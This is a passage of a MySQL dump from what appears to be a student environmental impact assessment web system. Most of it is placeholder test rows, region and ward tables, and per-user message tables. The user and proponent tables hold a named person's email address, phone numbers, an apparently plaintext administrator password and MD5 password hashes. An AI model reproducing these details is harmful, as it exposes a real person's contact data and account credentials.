  `operation` varchar(240) DEFAULT NULL,
  `other` varchar(240) DEFAULT NULL,
  `projectid` varchar(30) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `pimpacts`
--

INSERT INTO `pimpacts` (`id`, `construction`, `operation`, `other`, `projectid`) VALUES
(1, 'HKHK', 'KHKH', 'HKHK', 'P-6948'),
(2, 'HK', 'KHKHK', 'HKHKH', 'P-6948'),
(3, 'HKHKH', 'HKHK', 'KHK', 'P-6948'),
(4, 'FYKJMN CF', 'FVHYJM  V', 'IK, M F', 'P-9662'),
(5, 'JM VGTJ', 'KMM  C', 'KOMBFT', 'P-9662'),
(6, ' VCGFHJ M', 'JMM VF', 'VGYUKNB', 'P-9662'),
(7, 'hgyti', 'kjkujdftru', 'nkj', 'P-8706'),
(8, 'ioiuohjbjcszes', 'ihkbcdxys', 'bhv', 'P-8706'),
(9, 'uighyvgcfrtduj', 'nlghg', 'hdes6ty', 'P-8706'),
(10, 'bvbvb', 'bvbv', 'bvb', 'P-5039'),
(11, 'bvvb', 'vbvbv', 'vbvb', 'P-5039'),
(12, 'bvbv', 'bvb', 'bvbv', 'P-5039');

-- --------------------------------------------------------

--
-- Table structure for table `pinfrastructure`
--

CREATE TABLE `pinfrastructure` (
  `id` int(3) NOT NULL,
  `structure` varchar(20) DEFAULT NULL,
  `land` varchar(20) DEFAULT NULL,
  `wsource` varchar(20) DEFAULT NULL,
  `wquantity` varchar(30) DEFAULT NULL,
  `ptype` varchar(30) DEFAULT NULL,
  `psource` varchar(50) DEFAULT NULL,
  `pquantity` varchar(20) DEFAULT NULL,
  `road` varchar(30) DEFAULT NULL,
  `other` varchar(30) DEFAULT NULL,
  `projectid` varchar(30) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `pinfrastructure`
--

INSERT INTO `pinfrastructure` (`id`, `structure`, `land`, `wsource`, `wquantity`, `ptype`, `psource`, `pquantity`, `road`, `other`, `projectid`) VALUES
(1, 'bvbvbvBBVBVBvbvb', 'vbvb', 'vbvB', 'VBVB', 'VBVB', 'VBVJ', 'HJHJ', 'VBVB', 'HJHK', 'P-6948'),
(2, 'DRTUTYTI', 'XCVNHYR', ' NMKIKUTC', 'KLIKUTYFVDXWE', 'N VBDFRYUJM', 'RFTYUKM FCT', 'FHUJHGVJI', 'LKMBDCEY', ' BTRFDGTRF', 'P-9662'),
(3, 'ioipop', 'oipi', 'poip', 'iopio', 'opjk', 'ioj', 'hn', 'piopi', 'jujknjln\r\nbjkbjk', 'P-8706'),
(4, 'bbvbv', '', 'vbvb', 'bvbvb', 'bvbvb', 'bvbvb', 'bvbb', 'bvbv', 'vbvb', 'P-5039');

-- --------------------------------------------------------

--
-- Table structure for table `proponent`
--

CREATE TABLE `proponent` (
  `id` int(3) NOT NULL,
  `fname` varchar(20) DEFAULT NULL,
  `mname` varchar(20) DEFAULT NULL,
  `lname` varchar(20) DEFAULT NULL,
  `userid` varchar(5) DEFAULT NULL,
  `pinno` varchar(30) DEFAULT NULL,
  `address` varchar(30) DEFAULT NULL,
  `contperson` varchar(50) DEFAULT NULL,
  `tele` varchar(20) DEFAULT NULL,
  `fax` varchar(30) DEFAULT NULL,
  `email` varchar(30) DEFAULT NULL,
  `projectid` varchar(10) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `proponent`
--

INSERT INTO `proponent` (`id`, `fname`, `mname`, `lname`, `userid`, `pinno`, `address`, `contperson`, `tele`, `fax`, `email`, `projectid`) VALUES
(66, 'vbvvb', '', 'bvb', '6410', 'nmnmnmnm', '', 'mnmn', 'nmnmn', 'mnmnm', 'nmnmn', 'P-6948'),
(70, 'MirajI Salum', '', 'Kakoi', '6469', 'FS29NC540', '', 'Salum Shahid', '0788221859', '+255198754034', 'mirajissa1@gmail.com', 'P-9662'),
(71, 'MirajI Salum', '', 'Kakoi', '6469', 'W73NB537NMD', '', 'Mussa Aly', '246562762879279', '+3254687143878', 'nbhgsdjmnhcjsdkhs', 'P-8706'),
(72, 'MirajI Salum', '', 'Kakoi', '6469', 'VCVCC', '', 'CVCVCVC', 'VCVCV', 'VCVCV', 'VCV', 'P-5039'),
(73, 'MirajI Salum', '', 'Kakoi', '6469', 'UDSM', '', 'mnnmn', '55656', '6565656', 'mirajissa6@gmail.com', 'P-9243');

-- --------------------------------------------------------

--
-- Table structure for table `pscope`
--

CREATE TABLE `pscope` (
  `id` int(3) NOT NULL,
  `labour` varchar(20) DEFAULT NULL,
  `equipment` varchar(20) DEFAULT NULL,
  `capacity` varchar(20) DEFAULT NULL,
  `prodtype` varchar(100) DEFAULT NULL,
  `covarage` varchar(30) DEFAULT NULL,
  `market` varchar(30) DEFAULT NULL,
  `projectid` varchar(30) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `pscope`
--

INSERT INTO `pscope` (`id`, `labour`, `equipment`, `capacity`, `prodtype`, `covarage`, `market`, `projectid`) VALUES
(15, 'OPOPOP', 'POPOPOP', 'OPOPOP', 'OPOPOP', 'OPOPO', 'POPOP', 'P-2829'),
(17, '', '', '', '', '', '', 'P-2690'),
(18, '', '', '', '', '', '', 'P-3384'),
(19, 'nmnmn', 'mnmnmn', 'mnmnm', 'nmnmn', 'mnmnm', 'nmnmn', 'P-6948'),
(20, '', '', '', '', '', '', 'P-9662'),
(21, 'ewewewwew', 'eewewewe', 'ewewe', 'wewew', 'ewewe', 'wewe', 'P-8706'),
(22, 'bvbvb', 'bvbvb', 'bvbvb', 'bvbvb', '32434', 'bvbvbbvb', 'P-5039');

-- --------------------------------------------------------

--
-- Table structure for table `psite`
--

CREATE TABLE `psite` (
  `id` int(3) NOT NULL,
  `location` varchar(20) DEFAULT NULL,
  `district` varchar(20) DEFAULT NULL,
  `region` varchar(20) DEFAULT NULL,
  `zone` varchar(30) DEFAULT NULL,
  `landuse` varchar(30) DEFAULT NULL,
  `distance` varchar(30) DEFAULT NULL,
  `description` varchar(100) DEFAULT NULL,
  `projectid` varchar(30) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `psite`
--

INSERT INTO `psite` (`id`, `location`, `district`, `region`, `zone`, `landuse`, `distance`, `description`, `projectid`) VALUES
(17, '', '', '', '', '', '', '', 'P-3384'),
(18, 'mnmn', 'mnmnm', 'nmnm', 'nmnm', 'nmnmn', 'mnmn', 'mnmn', 'P-6948'),
(19, '', '', '', '', '', '', '', 'P-9662'),
(20, 'wewe', 'wewew', 'ewe', 'wewe', 'wewe', 'wewe', 'wewe', 'P-8706'),
(21, '', 'Ngudu', 'Mwanza', NULL, 'bvbvb', 'bvbvbvb', 'bbvvbbv', 'P-5039');

-- --------------------------------------------------------

--
-- Table structure for table `region`
--

CREATE TABLE `region` (
  `rid` int(11) NOT NULL,
  `rname` varchar(100) NOT NULL,
  `rzone` varchar(50) DEFAULT NULL,
  `covarage` varchar(50) DEFAULT NULL,
  `activity` varchar(30) DEFAULT NULL,
  `remarks` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `region`
--

INSERT INTO `region` (`rid`, `rname`, `rzone`, `covarage`, `activity`, `remarks`) VALUES
(2, 'Mwanza', 'Lake Zone', '42121845', 'Fishing', NULL),
(3, 'Dar es Salaam', 'Coastal', '546754', 'Business', NULL),
(4, 'Kigoma', 'Western', '454298', 'Agriculture', NULL),
(5, 'Arusha', 'Northern Zone', '24372848', 'Tourism', '54376353'),
(6, 'Mbeya', 'Lake Zone', '53626', 'Agriculture', 'Ok');

-- --------------------------------------------------------

--
-- Table structure for table `u6410`
--

CREATE TABLE `u6410` (
  `id` int(7) NOT NULL,
  `msgto` varchar(4) DEFAULT NULL,
  `msgfrom` varchar(4) DEFAULT 'ME',
  `message` varchar(255) DEFAULT NULL,
  `date` varchar(12) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `u6410`
--

INSERT INTO `u6410` (`id`, `msgto`, `msgfrom`, `message`, `date`) VALUES
(1, NULL, '6469', 'n', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `u6469`
--

CREATE TABLE `u6469` (
  `id` int(7) NOT NULL,
  `msgto` varchar(4) DEFAULT NULL,
  `msgfrom` varchar(4) DEFAULT 'ME',
  `message` varchar(255) DEFAULT NULL,
  `date` varchar(12) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `u6469`
--

INSERT INTO `u6469` (`id`, `msgto`, `msgfrom`, `message`, `date`) VALUES
(13, '9490', 'ME', 'Hello member from ECO Company', NULL),
(14, '9490', 'ME', 'Hope this email will find you well', NULL),
(15, NULL, '9490', 'Thanks Admin Got u', NULL),
(16, '9912', 'ME', 'hgytttu', NULL),
(17, '6469', 'ME', 'Hello Admin', NULL),
(18, NULL, '6469', 'Hello Admin', NULL),
(19, NULL, '9490', 'Hello system Admin I got the trouble in logging in to my system but thanks it has fixed .', NULL),
(20, '9099', 'ME', 'Hello\r\n', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `u9099`
--

CREATE TABLE `u9099` (
  `id` int(7) NOT NULL,
  `msgto` varchar(4) DEFAULT NULL,
  `msgfrom` varchar(4) DEFAULT 'ME',
  `message` varchar(255) DEFAULT NULL,
  `date` varchar(12) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `u9099`
--

INSERT INTO `u9099` (`id`, `msgto`, `msgfrom`, `message`, `date`) VALUES
(1, NULL, '6469', 'Hajra', NULL),
(2, NULL, '6469', 'Hello\r\n', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `u9490`
--

CREATE TABLE `u9490` (
  `id` int(7) NOT NULL,
  `msgto` varchar(4) DEFAULT NULL,
  `msgfrom` varchar(4) DEFAULT 'ME',
  `message` varchar(255) DEFAULT NULL,
  `date` varchar(12) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `u9490`
--

INSERT INTO `u9490` (`id`, `msgto`, `msgfrom`, `message`, `date`) VALUES
(5, NULL, '6469', 'Hello member from ECO Company', NULL),
(6, NULL, '6469', 'Hope this email will find you well', NULL),
(7, '6469', 'ME', 'Thanks Admin Got u', NULL),
(8, '6469', 'ME', 'Hello system Admin I got the trouble in logging in to my system but thanks it has fixed .', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `u9912`
--

CREATE TABLE `u9912` (
  `id` int(7) NOT NULL,
  `msgto` varchar(4) DEFAULT NULL,
  `msgfrom` varchar(4) DEFAULT 'ME',
  `message` varchar(255) DEFAULT NULL,
  `date` varchar(12) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `u9912`
--

INSERT INTO `u9912` (`id`, `msgto`, `msgfrom`, `message`, `date`) VALUES
(1, NULL, '6469', 'hgytttu', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `uploads`
--

CREATE TABLE `uploads` (
  `id` int(3) NOT NULL,
  `uploader` varchar(50) DEFAULT NULL,
  `title` varchar(70) DEFAULT NULL,
  `userid` varchar(5) DEFAULT NULL,
  `file` varchar(50) DEFAULT NULL,
  `dateof` varchar(20) DEFAULT NULL,
  `type` varchar(40) DEFAULT NULL,
  `size` varchar(30) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `uploads`
--

INSERT INTO `uploads` (`id`, `uploader`, `title`, `userid`, `file`, `dateof`, `type`, `size`) VALUES
(2, 'MirajI Salum, Kakoi', 'Environmental Evaluation Project Report', '6469', '810-group_14.doc', '22/03/2017', 'application/msword', '1095.5'),
(3, 'ECO Company Limited, ', 'EEAS', '9490', '458-group14_presentation.ppt', '22/03/2017', 'application/vnd.ms-powerpoint', '1233.5'),
(4, 'ECO Company Limited, ', 'Image', '9490', '390-erd.png', '22/03/2017', 'image/png', '156.880859375'),
(5, 'MirajI Salum, Kakoi', 'ospf', '6469', '913-en1462860050-experts - 2014.pdf', '22/03/2017', 'application/pdf', '639.265625'),
(6, 'ECO Company Limited, ', 'Environmental Audit', '9490', '650-group14_presentation.pdf', '23/03/2017', 'application/pdf', '1033.19921875'),
(7, 'ECO Company Limited, ', 'GOOGLE REPORT', '9490', '861-en1466685071-regformfirms.pdf', '25/03/2017', 'application/pdf', '92.0361328125'),
(8, 'MirajI Salum, Kakoi', 'PRESENTATION', '6469', 'mir43', '25/03/2017', 'application/vnd.ms-powerpoint', '1233.5'),
(9, 'MirajI Salum, Kakoi', 'ECO Dar es Salaam Waste Management Report', '6469', '348-it security group 4.pdf', '27/03/2017', 'application/pdf', '205.4287109375'),
(10, 'ECO Company Limited, ', 'ENVIRONMENT', '9490', 'mir43', '30/03/2017', 'application/pdf', '51.185546875'),
(12, 'vbvvb, bvb', 'JEMA', '6410', '231-erd.png', '10/04/2017', 'image/png', '156.880859375'),
(13, 'vbvvb, bvb', 'PASSWORD', '6410', '854-fyp form.pdf', '10/04/2017', 'application/pdf', '13.490234375'),
(14, 'MirajI Salum, Kakoi', 'jiu', '6469', '274-en1466684352-environmental experts 2016-p3.pdf', '10/04/2017', 'application/pdf', '130.33203125'),
(15, 'ECO Company Limited, ', 'WATER TREATMENT IN NJOMBE', '9490', '309-quiz2-2015math110-solutions.pdf', '10/04/2017', 'application/pdf', '64.359375'),
(19, 'ECO Company Limited, ', 'wow', '9490', '338-sample.xls', '12/04/2017', 'application/vnd.ms-excel', '6'),
(20, 'MirajI Salum, Kakoi', 'TITLE', '6469', '905-en1462860050-experts - 2014.pdf', '20/04/2017', 'application/pdf', '639.265625');

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE `user` (
  `id` int(11) NOT NULL,
  `fname` varchar(255) DEFAULT NULL,
  `mname` varchar(15) DEFAULT NULL,
  `lname` varchar(255) DEFAULT NULL,
  `username` varchar(30) DEFAULT NULL,
  `email` varchar(20) DEFAULT NULL,
  `region` varchar(54) DEFAULT NULL,
  `district` varchar(54) DEFAULT NULL,
  `address` varchar(50) DEFAULT NULL,
  `password` varchar(100) DEFAULT NULL,
  `mobile` varchar(15) DEFAULT NULL,
  `remarks` varchar(200) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`id`, `fname`, `mname`, `lname`, `username`, `email`, `region`, `district`, `address`, `password`, `mobile`, `remarks`) VALUES
(100, 'Miraj', 'Issa', 'Salum', 'mirajissa1', 'mirajissa1@gmail.com', 'Mwanza', NULL, NULL, '00001994', '0788221859', 'Administrator'),
(104, 'KOKOK', 'KOKOK', 'KOKOKK', 'ONONOOON', 'ONNOO', 'Dodoma', '', NULL, '1cb0d2e53ea5696a3e01cce0cd100c1b', 'ONONON', NULL),
(105, 'VCVCVC', 'VCVCVC', 'CVCVC', 'QWERT', 'VCVCVCVCV', 'Dar es Salaam', 'Kinondoni', NULL, 'd0094b95f2af6ae7cf03222e25a0831c', 'CVCVCVCV', NULL),
(106, 'Miraji', 'Issa', 'Hamis', 'miraji1', 'Email', 'Kigoma', 'Kasulu', NULL, '77f64b9fde0f0835164ecffbd190bc5e', '07662llloo54193', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `ward`
--

CREATE TABLE `ward` (
  `id` int(5) NOT NULL,
  `rid` varchar(10) DEFAULT NULL,
  `did` int(5) DEFAULT NULL,
  `name` varchar(30) DEFAULT NULL,
  `population` varchar(11) DEFAULT NULL,
  `covarage` varchar(11) DEFAULT NULL,
  `remarks` varchar(200) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `ward`
--

INSERT INTO `ward` (`id`, `rid`, `did`, `name`, `population`, `covarage`, `remarks`) VALUES
(1, '3', 1, 'Tandika', '0', '0', NULL),
(2, '3', 1, 'Mbagala', '0', '0', NULL),
(3, '3', 1, 'Buza', '0', '0', NULL),
(4, '3', 1, 'Charambe', '0', '0', NULL),
(5, '3', 1, 'Yombo', '0', '0', NULL),
(6, '2', 2, 'Nyamanoro', '0', '0', NULL),
(7, '2', 2, 'Isamilo', '0', '0', NULL),
(8, '2', 2, 'Bwiru', '0', '0', NULL),
(9, '2', 2, 'Ibungiro', '0', '0', NULL),
(10, '3', 3, 'Ubungo', '0', '0', NULL),
(11, '3', 3, 'Oysterbay', '0', '0', NULL),
(12, '3', 3, 'Sinza', '0', '0', NULL),
(13, '3', 3, 'Tegeta', '0', '0', NULL),
(14, '2', 4, 'Nyakato', '0', '0', NULL),
(15, '2', 4, 'Mbugani', '0', '0', NULL),
(16, '2', 4, 'Mkuyuni', '0', '0', NULL),
(17, '2', 4, 'Butimba', '0', '0', NULL),
(18, '3', 5, 'Kibada', '0', '0', NULL),
(20, '3', 3, 'Wazo', '', '6567', ''),
(21, '4', 6, 'Mahembe', '98254', '5346', 'HOLLA'),
(22, '3', 5, 'Full Shangwe', '1000', '235', 'New'),
(23, '2', 4, 'Nyegezi', '800', '95', 'Bus Terminal'),
(24, '3', 3, 'Tandale', '2873', '37', ''),
(25, '2', 4, 'ewr', '76', '0943627', ''),
(26, '2', 4, 'Buzuruga', '12356', '2345', ''),
(27, '2', 4, 'Buzuruga', '12356', '2345', ''),
(28, '5', 8, '', '', '', '');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `accessdata`
--
ALTER TABLE `accessdata`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `accessdata_translator`
--
ALTER TABLE `accessdata_translator`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `accessinfo`
--
ALTER TABLE `accessinfo`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `alert`
--
ALTER TABLE `alert`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `district`
--
ALTER TABLE `district`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `event`
--
ALTER TABLE `event`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `excel`
--
ALTER TABLE `excel`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `expert`
--
ALTER TABLE `expert`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `message`
--
ALTER TABLE `message`
  ADD PRIMARY KEY (`message_id`);

--
-- Indexes for table `newsletter`
--
ALTER TABLE `newsletter`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `panel`
--
ALTER TABLE `panel`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `pdeia`
--
ALTER TABLE `pdeia`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `pdescription`
--
ALTER TABLE `pdescription`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `pimpacts`
--
ALTER TABLE `pimpacts`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `pinfrastructure`
--
ALTER TABLE `pinfrastructure`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `proponent`
--
ALTER TABLE `proponent`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `pscope`
--
ALTER TABLE `pscope`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `psite`
--
ALTER TABLE `psite`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `region`
--
ALTER TABLE `region`
  ADD PRIMARY KEY (`rid`);

--
-- Indexes for table `u6410`
--
ALTER TABLE `u6410`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `u6469`
--
ALTER TABLE `u6469`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `u9099`
--
ALTER TABLE `u9099`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `u9490`
--
ALTER TABLE `u9490`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `u9912`
--
ALTER TABLE `u9912`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `uploads`
--
ALTER TABLE `uploads`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ward`
--
ALTER TABLE `ward`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `accessdata`
--
ALTER TABLE `accessdata`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=52;
--
-- AUTO_INCREMENT for table `accessdata_translator`
--
ALTER TABLE `accessdata_translator`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;
--
-- AUTO_INCREMENT for table `accessinfo`
--
ALTER TABLE `accessinfo`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=894;
--
-- AUTO_INCREMENT for table `alert`
--
ALTER TABLE `alert`
  MODIFY `id` int(7) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;
--
-- AUTO_INCREMENT for table `district`
--
ALTER TABLE `district`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
--
-- AUTO_INCREMENT for table `event`
--
ALTER TABLE `event`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=105;
--
-- AUTO_INCREMENT for table `excel`
--
ALTER TABLE `excel`
  MODIFY `id` int(3) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;
--
-- AUTO_INCREMENT for table `message`
--
ALTER TABLE `message`
  MODIFY `message_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;
--
-- AUTO_INCREMENT for table `newsletter`
--
ALTER TABLE `newsletter`
  MODIFY `id` int(4) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT for table `pdeia`
--
ALTER TABLE `pdeia`
  MODIFY `id` int(3) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;
--
-- AUTO_INCREMENT for table `pdescription`
--
ALTER TABLE `pdescription`
  MODIFY `id` int(3) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=25;
--
-- AUTO_INCREMENT for table `pimpacts`
--
ALTER TABLE `pimpacts`
  MODIFY `id` int(3) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;
--
-- AUTO_INCREMENT for table `pinfrastructure`
--
ALTER TABLE `pinfrastructure`
  MODIFY `id` int(3) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT for table `proponent`
--
ALTER TABLE `proponent`
  MODIFY `id` int(3) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=74;
--
-- AUTO_INCREMENT for table `pscope`
--
ALTER TABLE `pscope`
  MODIFY `id` int(3) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=23;
--
-- AUTO_INCREMENT for table `psite`
--
ALTER TABLE `psite`
  MODIFY `id` int(3) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=22;
--
-- AUTO_INCREMENT for table `region`
--
ALTER TABLE `region`
  MODIFY `rid` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
--
-- AUTO_INCREMENT for table `u6410`
--
ALTER TABLE `u6410`
  MODIFY `id` int(7) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `u6469`
--
ALTER TABLE `u6469`
  MODIFY `id` int(7) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;
--
-- AUTO_INCREMENT for table `u9099`
--
ALTER TABLE `u9099`
  MODIFY `id` int(7) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT for table `u9490`
--
ALTER TABLE `u9490`
  MODIFY `id` int(7) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;
--
-- AUTO_INCREMENT for table `u9912`
--
ALTER TABLE `u9912`
  MODIFY `id` int(7) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `uploads`
--
ALTER TABLE `uploads`
  MODIFY `id` int(3) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;
--
-- AUTO_INCREMENT for table `user`
--
ALTER TABLE `user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=107;
--
-- AUTO_INCREMENT for table `ward`
--
ALTER TABLE `ward`
  MODIFY `id` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=29;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
